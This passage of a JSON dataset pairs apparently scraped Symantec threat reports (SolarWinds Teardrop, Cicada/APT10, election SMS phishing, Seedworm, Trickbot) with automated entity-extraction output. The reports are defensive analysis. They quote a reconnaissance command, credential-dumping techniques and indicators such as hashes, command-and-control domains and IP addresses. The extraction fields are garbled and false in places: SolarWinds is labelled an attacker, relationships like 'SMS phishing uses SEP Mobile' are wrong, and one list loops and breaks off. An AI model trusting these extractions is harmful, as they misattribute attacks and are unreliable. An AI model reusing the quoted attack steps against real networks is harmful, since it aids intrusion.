Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. The second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control. The post-compromise attack chain for one computer investigated saw the initial Sunburst malware, a modified solarwinds.orion.core.businesslayer.dll, installed through the Orion update process on the victim computer on the 7th of the month. On the 28th of the month, 21 days later, the legitimate executable solarwinds.businesslayerhost.exe, which loads the malicious DLL, created a copy of Teardrop in a file called cbsys.dll, in the c:\\windows\\panther folder. This filename and path appear to be unusual since most instances of Teardrop were created in a file called netsetupsvc.dll in the c:\\windows\\syswow64 folder, as documented by FireEye. The Backdoor.Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool. Adfind, a tool that is able to query Active Directory, is then introduced to the system as searchindex.exe and then executed (cmd.exe /c SearchIndex.exe -sc u:<removed> > .\\h.txt). Results are saved in the file h.txt. Using this information, the attackers are attempting to gain elevated privileges (e.g. domain administrator) to access the domain or laterally traverse the environment. Orion users should update to Orion Platform version 2020.2.1 HF 2. Orion users should check their networks for indications of post-compromise activity, including: It should be borne in mind that although there may be some commonalities in post-compromise activity, each victim is likely to see different patterns in activity. That activity is likely to involve heavy use of living-off-the-land techniques to minimize the likelihood of being detected, something the attackers seem to be prioritizing based on how they conducted the first stages of the attack. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Teardrop, Malware), (Sunburst, Malware), (Solorigate, Malware), (SolarWinds, Attacker), (Symantec, Tool), (Digicert, Tool), (Legacy Certificate, Tool)\\nRelationships: (Teardrop, uses, Sunburst), (Teardrop, uses, Solorigate), (SolarWinds, uses, Legacy Certificate), (SolarWinds, uses, Teardrop), (SolarWinds, uses, Sunburst), (SolarWinds, uses, Solorigate), (Teardrop, deployedBy, SolarWinds), (SolarWinds, attackedBy, Teardrop), (SolarWinds, attackedBy, Sunburst), (SolarWinds, attackedBy, Solorigate), (SolarWinds, attackedBy, Teardrop), (SolarWinds, attackedBy, Sunburst), (SolarWinds, attackedBy, Solorigate), (SolarWinds, attackedBy, Teardrop), (SolarWinds, attackedBy, Sunburst), (SolarWinds, attackedBy, Solorigate), (SolarWinds, attackedBy, Teardrop), (SolarWinds, attackedBy, Sunburst), (SolarWinds, attackedBy, Solorigate), (SolarWinds, attackedBy, Teardrop), (SolarWinds, attackedBy, Sunburst), (SolarWinds",
      "entities": [
        [
          "Teardrop",
          "Malware"
        ],
        [
          "Sunburst",
          "Malware"
        ],
        [
          "Solorigate",
          "Malware"
        ],
        [
          "SolarWinds",
          "Attacker"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "Digicert",
          "Tool"
        ],
        [
          "Legacy Certificate",
          "Tool"
        ],
        [
          "Teardrop",
          "uses",
          "Sunburst"
        ],
        [
          "Teardrop",
          "uses",
          "Solorigate"
        ],
        [
          "SolarWinds",
          "uses",
          "Legacy Certificate"
        ],
        [
          "SolarWinds",
          "uses",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "uses",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "uses",
          "Solorigate"
        ],
        [
          "Teardrop",
          "deployedBy",
          "SolarWinds"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Solorigate"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Solorigate"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Solorigate"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Solorigate"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Teardrop"
        ],
        [
          "SolarWinds",
          "attackedBy",
          "Sunburst"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 28,
    "relationship_count": 0
  },
  {
    "title": "cicada apt10 japan espionage",
    "link": "https://www.security.com/threat-intelligence/cicada-apt10-japan-espionage",
    "content": "A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it toCicada (aka APT10, Stone Panda, Cloud Hopper).Cicada has been involved in espionage-type operations since 2009, andU.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government. Cicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines. The attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020. This campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer’s networks triggered an alert in ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis. Cloud Analytics leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity. This campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide. The companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together. Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns. As is clear from the map inFigure 1, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China’s borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization. We also saw similar loaders on all the victim networks. These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including: The amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks. In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later. We observed the attackers using a wide variety of living-off-the-land, dual-use, and publicly available tools and techniques in these attacks, including: The threat actors also use a legitimate cloud file-hosting service for exfiltration. The attackers also useDLL side-loadingat multiple stages during the attack, including using it to load Backdoor.Hartip. DLL side-loading occurs when attackers are able to replace a legitimate library with a malicious one, allowing them to load malware into legitimate processes. Attackers use DLL side-loading to try and hide their activity by making it look legitimate, and it also helps them avoid detection by security software. It is a tactic that is commonly used by APT groups and has often been observed being used by nation-state backed actors. Monitoring networks for unusual activity, as Symantec’s Cloud Analytics technology does, is key for detecting this kind of malicious activity. The attackers were also seen deploying a tool capable of exploiting the ZeroLogon vulnerability (CVE-2020-1472). The critical elevation-of-privilege vulnerability was first disclosed and patched on August 11, 2020, and can allow attackers to spoof a domain controller account and then potentially use it to steal domain credentials, take over the domain, and completely compromise all Active Directory identity services. It has been exploited by multiple malicious actors since its disclosure, leading both Microsoft and the Department of Homeland Security’s (DHS) Cybersecurity and Infrastructure Security Agency (CISA) to issue warnings to Windows users to patch the issue as quickly as possible. The scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, such as a nation-state actor, with Symantec discovering enough evidence to attribute it with medium confidence to Cicada. Symantec analysts have linked this activity to Cicada due to the use of previously seen obfuscation techniques and shellcode on loader DLLs. Activity seen in one of the victim organizations has various trait similarities with previously seen Cicada activity that was describedin a blog by Cylance in 2019, including: In another affected organization, the loaders deploying Backdoor.Hartip overlap in the obfuscation and shellcode used, making us confident it is the same actor in both organizations. Similarities between activity in both organizations These similarities leave us confident that this is the same group carrying out this activity in both organizations, and that this group is Cicada. Historically, Cicada has been seen using custom DLL loaders to decrypt and execute its final payload, as is observed in these attacks. We also saw similar loaders as those used in these two organizations used on other victim networks. The scale of the operations also points to a group of Cicada’s size and capabilities. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups. The link all the victims have to Japan also points towards Cicada, which has been known to target Japanese organizations in the past. The targeting of MSPs is also a hallmark of Cicada’s activity. Successfully compromising an MSP can give attackers high-level access to multiple companies without them having to compromise the individual companies’ networks. We have also seen Cicada utilizing some of the same publicly available tools – such as WMIExec – in the past. The attackers also take various steps to reduce the chances of their activity being spotted – including searching for security software on victim machines using WMIC, and using PowerShell to clear event logs to hide their activity once they are finished on victim machines. This kind of activity is the hallmark of sophisticated and experienced threat actors. All of these facts point to Cicada being the perpetrator of these wide-ranging and sophisticated attacks. Intelligence gathering and stealing information has generally been the motivation behind Cicada’s attacks in the past, and that would appear to be the case in this attack campaign too. We observed the attackers archiving some folders of interest in these attacks, including in one organization folders relating to human resources (HR), audit and expense data, and meeting memos. Japan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity. Cicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims. The group’s use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks. This activity was first discovered thanks to an alert triggered by ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). 8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057d5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c18874326460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6acdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086ea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc427873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2edcf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab903ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239 178.73.210.238188.119.112.225213.252.246.24545.14.224.9345.67.230.13481.7.7.15995.179.143.32 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Japanese companies, Targeted), (subsidiaries, Location), (automotive, Sector), (pharmaceutical, Sector), (engineering, Sector), (managed service providers (MSPs), Sector), (living-off-the-land tools, Tool), (custom malware, Malware), (Backdoor.Hartip, Malware), (ZeroLogon vulnerability, Vulnerability), (DLL side-loading, Technique), (August 2020, Date), (Chinese government, Attacker)\nRelationships: (Japanese companies, targetedBy, cicada), (Japanese companies, locationOfSubsidiaries, as many as 17 regions around the globe), (automotive, sector, targeted), (pharmaceutical, sector, targeted), (engineering, sector, targeted), (managed service providers (MSPs), sector, targeted), (cicada, uses, living-off-the-land tools), (cicada, uses, custom malware), (cicada, uses, zeroLogon vulnerability), (cicada, uses, dllSideLoading)",
      "entities": [
        [
          "Japanese companies",
          "Targeted"
        ],
        [
          "subsidiaries",
          "Location"
        ],
        [
          "automotive",
          "Sector"
        ],
        [
          "pharmaceutical",
          "Sector"
        ],
        [
          "engineering",
          "Sector"
        ],
        [
          "living-off-the-land tools",
          "Tool"
        ],
        [
          "custom malware",
          "Malware"
        ],
        [
          "Backdoor.Hartip",
          "Malware"
        ],
        [
          "ZeroLogon vulnerability",
          "Vulnerability"
        ],
        [
          "DLL side-loading",
          "Technique"
        ],
        [
          "August 2020",
          "Date"
        ],
        [
          "Chinese government",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "Japanese companies",
          "targetedBy",
          "cicada"
        ],
        [
          "Japanese companies",
          "locationOfSubsidiaries",
          "as many as 17 regions around the globe"
        ],
        [
          "automotive",
          "sector",
          "targeted"
        ],
        [
          "pharmaceutical",
          "sector",
          "targeted"
        ],
        [
          "engineering",
          "sector",
          "targeted"
        ],
        [
          "cicada",
          "uses",
          "living-off-the-land tools"
        ],
        [
          "cicada",
          "uses",
          "custom malware"
        ],
        [
          "cicada",
          "uses",
          "zeroLogon vulnerability"
        ],
        [
          "cicada",
          "uses",
          "dllSideLoading"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 9
  },
  {
    "title": "sms phishing presidential election",
    "link": "https://www.security.com/threat-intelligence/sms-phishing-presidential-election",
    "content": "SMS-based outreach has become a standard in the political playbook, with candidates and their supporters soliciting financial support, opinions, and votes through texting with increasing frequency and sophistication. In the course of protecting enterprise endpoints, Symantec, a division of Broadcom (NASDAQ: AVGO), has turned up evidence of an increasingly prevalent scam tactic in the run-up to the U.S. presidential election: SMS phishing attempts using bait with campaign, voting, and political themes. Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. We took a look at the links contained in SMS messages sent to mobile devices located in the United States between the first week in August and late October 2020 and found a sharp increase during that period in the percentage of election-themed messages containing phishing URLs. Over the last three months, we observed the number of election-associated text messages containing links to websites double. Of these messages, we saw the number bringing the user to a scam/phishing/or attack-associated website increase from 1 in 5 (18.3%) to almost half (48.6%). These attacks have been observed in all regions of the United States, and target the full range of the political spectrum. SMS phishing presents a risk to all smartphone users. In addition to relying on protection likeSymantec Endpoint Protection Mobile, it’s a good idea to follow these recommendations: Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (SMS phishing, Threat Type), (SEP Mobile, Tool), (SEPMobile, deployedBy, Symantec), (URL, File), (election-themed message, File), (website, File), (attack-associated website, File), (United States, Location), (political spectrum, Range)\nRelationships: (SMS phishing, uses, SEP Mobile), (SEP Mobile, deployedBy, Symantec), (SEP Mobile, detects, election-themed message), (SEP Mobile, alerts, link), (election-themed message, contains, URL), (URL, resolvesTo, website), (website, contains, attack-associated website), (United States, targets, political spectrum)",
      "entities": [
        [
          "SMS phishing",
          "Threat Type"
        ],
        [
          "SEP Mobile",
          "Tool"
        ],
        [
          "SEPMobile",
          "deployedBy",
          "Symantec"
        ],
        [
          "URL",
          "File"
        ],
        [
          "election-themed message",
          "File"
        ],
        [
          "website",
          "File"
        ],
        [
          "attack-associated website",
          "File"
        ],
        [
          "United States",
          "Location"
        ],
        [
          "political spectrum",
          "Range"
        ]
      ],
      "relationships": [
        [
          "SMS phishing",
          "uses",
          "SEP Mobile"
        ],
        [
          "SEP Mobile",
          "deployedBy",
          "Symantec"
        ],
        [
          "SEP Mobile",
          "detects",
          "election-themed message"
        ],
        [
          "SEP Mobile",
          "alerts",
          "link"
        ],
        [
          "election-themed message",
          "contains",
          "URL"
        ],
        [
          "URL",
          "resolvesTo",
          "website"
        ],
        [
          "website",
          "contains",
          "attack-associated website"
        ],
        [
          "United States",
          "targets",
          "political spectrum"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 8
  },
  {
    "title": "seedworm apt iran middle east",
    "link": "https://www.security.com/threat-intelligence/seedworm-apt-iran-middle-east",
    "content": "The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East. Many of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop. The recent wave of Seedworm attacks were uncovered by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) which linked it to previous Seedworm activity. Among the things flagged by Cloud Analytics was a registry key called “SecurityHealthCore\". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor.Mori) was subsequently detected. Attacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted. In one such victim, a sample of Backdoor.Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers. During this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using an open-source tools known asSecure Sockets Funneling(SSF) andChisel. Seedworm is known to have leveraged Chisel in the past. Credential dumping was done by dumping the contents of the Windows Registry to files in the same directories as Seedworm backdoors. Additionally, Seedworm was also observed using Quarks password dumper (Quarks PwDump) to steal local account password hashes. Seedworm was also observed setting up tunnels to its own infrastructure using Secure Sockets Funneling and Chisel. These tools allow the attackers to configure local and remote port forwarding as well as copying files to compromised machines. On the same machine where Seedworm was active, a tool known as PowGoop was deployed. This same tool was also deployed against several of the organizations attacked by Seedworm in recent months; however, at present Symantec can only establish a medium-confidence link between PowGoop and Seedworm. PowGoop, which was first publicly reported on in July 2020, is a loader DLL. It likely arrives in a ZIP file named ‘google.zip’ containing the loader itself and legitimate Google binaries used for side-loading it. In the same organization as mentioned previously, Symantec observed Seedworm activity which was followed by PowGoop activity just six days later. In the majority of recent infections, PowGoop appears to have been deployed via a remote execution tool known asRemadmin. This tool is used to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is used to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe. A feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We have no reason to believe that these are actual people’s names. On several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the victim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate ‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file called ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code. In some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’. Similarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools: Similar download requests were also observed via PowerShell: During PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity. In several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware (Backdoor.Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by DLL side-loading of PowGoop. Additionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos, similar towhat has been reported on Seedworm‘s Powerstats in the past. These patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To date, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools: While none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm for any additional evidence. PowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of ransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer. Our peers at Palo Alto Networks reportedthat PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos. This lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection. Symantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the simultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used exclusively to deliver Thanos. Symantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia, and Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education. Seedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across the Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s part. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough investigation. The following protections are in place to protect customers against Seedworm attacks: File-based protection Network-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Seedworm, Attacker), (PowGoop, Tool), (NASDAQ: AVGO, Company), (Targeted Attack Cloud Analytics, Tool), (Threat Hunter team, Team), (Backdoor.Mori, Malware), (Iraq, Country), (Turkey, Country), (Kuwait, Country), (United Arab Emirates, Country), (Georgia, Country), (sam, File)\nRelationships: (Seedworm, uses, PowGoop), (Seedworm, linkedTo, NASDAQ: AVGO), (Seedworm, uses, Targeted Attack Cloud Analytics), (Seedworm, linkedTo, Threat Hunter team), (Seedworm, contains, Backdoor.Mori), (Attack, targets, Iraq), (Attack, targets, Turkey), (Attack, targets, Kuwait), (Attack, targets, United Arab Emirates), (Attack, targets, Georgia), (Attack, targets, sam)",
      "entities": [
        [
          "Seedworm",
          "Attacker"
        ],
        [
          "PowGoop",
          "Tool"
        ],
        [
          "NASDAQ: AVGO",
          "Company"
        ],
        [
          "Targeted Attack Cloud Analytics",
          "Tool"
        ],
        [
          "Threat Hunter team",
          "Team"
        ],
        [
          "Backdoor.Mori",
          "Malware"
        ],
        [
          "Iraq",
          "Country"
        ],
        [
          "Turkey",
          "Country"
        ],
        [
          "Kuwait",
          "Country"
        ],
        [
          "United Arab Emirates",
          "Country"
        ],
        [
          "Georgia",
          "Country"
        ],
        [
          "sam",
          "File"
        ]
      ],
      "relationships": [
        [
          "Seedworm",
          "uses",
          "PowGoop"
        ],
        [
          "Seedworm",
          "linkedTo",
          "NASDAQ: AVGO"
        ],
        [
          "Seedworm",
          "uses",
          "Targeted Attack Cloud Analytics"
        ],
        [
          "Seedworm",
          "linkedTo",
          "Threat Hunter team"
        ],
        [
          "Seedworm",
          "contains",
          "Backdoor.Mori"
        ],
        [
          "Attack",
          "targets",
          "Iraq"
        ],
        [
          "Attack",
          "targets",
          "Turkey"
        ],
        [
          "Attack",
          "targets",
          "Kuwait"
        ],
        [
          "Attack",
          "targets",
          "United Arab Emirates"
        ],
        [
          "Attack",
          "targets",
          "Georgia"
        ],
        [
          "Attack",
          "targets",
          "sam"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 11
  },
  {
    "title": "trickbot botnet ransomware disruption",
    "link": "https://www.security.com/threat-intelligence/trickbot-botnet-ransomware-disruption",
    "content": "A global partnership of security, software, telecommunications and financial services firms have struck a blow against the notorious Trickbot botnet by securing a court order directing hosting providers to take down its infrastructure. The order was obtainedin a U.S. lawsuit filed by Microsoftand the Financial Services Information Sharing and Analysis Center (FS-ISAC) against Trickbot’s anonymous operators and was based on technical evidence provided by the Symantec, a division of Broadcom (NASDAQ: AVGO) Threat Hunter Team and others. The legal action marked the culmination of a years-long, cross-industry collaboration to find innovative ways to thwart a pernicious botnet that has fueled numerous cyber-crime sprees. Inwritten testimony provided to the court, Symantec technical director Vikram Thakur said Trickbot has spread prolifically across the internet for years and become one of the most commonly blocked types of malware, suggesting it is now one of the world’s largest botnets. Thakur described the serious harm caused to users whose computers are infected with Trickbot and whose banking credentials and other sensitive information are frequently stolen by the attackers. He also described its impact on financial institutions, which have borne significant losses due to Trickbot fraud. In recent times, Trickbot has been implicated in targeted ransomware attacks, where credentials stolen by the malware were used by the Ryuk ransomware operators to compromise victims’ networks and encrypt all accessible computers. This assessment has beenconfirmed by Europol, which recently noted that “the relationship between Emotet [another botnet], Ryuk and Trickbot is considered one of the most notable in the cybercrime world”. The botnet’s impact on banks and other financial sector organizations prompted a successful and close collaboration between the security industry and the financial sector, represented by FS-ISAC. Unlike prior legal “takedown” actions against botnets, this case did not involve seizure of malicious infrastructure or redirection of network traffic but instead relied upon intellectual-property laws to effectively evict the botnet operators from the command-and-control servers they need to maintain access to victim machines. Trickbot is a major botnet consisting of computers that have been infected with the Trickbot Trojan (Trojan.Trickybot). The Trojan is modular in nature, meaning it can easily be customized with one or more of an array of custom components designed to carry out a range of malicious activities on infected computers. To date, it has mainly been used for two main purposes: stealing credentials from infected computers and acting as a distribution channel for other malware. Symantec believes that Trickbot’s operators earn most of their revenue from selling stolen credentials on the cyber underground and leasing out the botnet as a distribution channel for other malware authors. Trickbot is spread through spam and phishing email campaigns which usually bear a Microsoft Word attachment containing malicious macros. If the document is opened by the unsuspecting user, Trickbot will be installed on the victim’s computer. In some cases, other malware, particularly ransomware, is also installed on the victim’s computer. Trickbot will also attempt to leverage known software vulnerabilities to move across the victim’s network and install itself on other computers. Trickbot is modular malware, capable of performing a range of different malicious activities. The first module to be installed on the victim’s computer is the loader, which contains an encrypted list of IP addresses from which it can download its main module. Once downloaded, the main module will check the architecture of the victim computer and save this along with the bot’s own information. The main component then prepares a framework for additional modules and initiates a connection to one of a pre-configured list of command and control (C&C) servers. The main module downloads one or more additional modules. Known modules include: Trickbot includes a number of features designed to minimize the risk of detection by security software. For example, the main module is designed to evade execution within “sandboxes,” which are controlled environments used by security companies to analyze malware. This module will also check the current user’s privileges and, if they have low privileges, it will elevate them using User Access Control (UAC) bypass, a technique that allows execution of programs with elevated privileges without the user being prompted. When it obtains elevated privileges, Trickbot will attempt to identify any security software that is installed on the computer and attempt to stop it and end any related services. One of the main threats for Trickbot victims is credential theft. This is carried out by a module that monitors for browser visits to a pre-configured list of banking websites. If the user visits any of these websites, the module intercepts and alters network traffic between the computer and the website, allowing the attackers to steal the victim’s banking credentials after they are input by the user. Trickbot will also attempt to steal other credentials from Chrome and Internet Explorer’s password storage features, from various RDP and SSH related services, and from other password managers. While infected computers are added to the Trickbot botnet, they yield the most value to attackers immediately after infection. Other malware families are usually delivered at the point of initial infection. Credential theft happens immediately after infection, while banking credentials are stolen the first time the victim attempts to log into their bank. Even if the malware is subsequently detected and the computer is removed from the botnet, much of the damage will have been done at this point, with stolen credentials exfiltrated by the attackers and likely sold to other cyber criminals. By pooling resources and intelligence and utilizing available legal avenues, the information security and financial sectors hope to strike a major blow against Trickbot. Symantec is grateful for the leadership of Microsoft and FS-ISAC and the support of ESET, NTT, and Lumen Technologies. This latest action, however, is just one step in an ongoing campaign. Complete eradication of this botnet will likely require additional actions from government partners in multiple jurisdictions. However, this action proves that successful private industry collaboration can be effective in countering cyber-crime and we hope that this set a new precedent for further initiatives. The following protections are in place to protect customers against Trickbot activity: Symantec recommends users observe the following best practices to protect against Trickbot attacks: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Trickbot, Threat Type), (Symantec, Company), (NASDAQ: AVGO, Stock Exchange), (Vikram Thakur, Person), (Trickbot, Malware), (financial services firms, Organization), (hosting providers, Organization), (U.S., Country), (Cybercrime, Crime), (banking credentials, Vulnerability), (financial institutions, Organization), (Ryuk ransomware, Malware)\nRelationships: (Trickbot, uses, Symantec), (Trickbot, targets, financial institutions), (Trickbot, exploitedBy, Ryuk ransomware), (Trickbot, causes, Cybercrime), (Trickbot, spreads, years), (Trickbot, is, one of the world's largest botnets), (Trickbot, impacts, financial institutions), (Trickbot, is, targeted by ransomware)",
      "entities": [
        [
          "Trickbot",
          "Threat Type"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "NASDAQ: AVGO",
          "Stock Exchange"
        ],
        [
          "Vikram Thakur",
          "Person"
        ],
        [
          "Trickbot",
          "Malware"
        ],
        [
          "financial services firms",
          "Organization"
        ],
        [
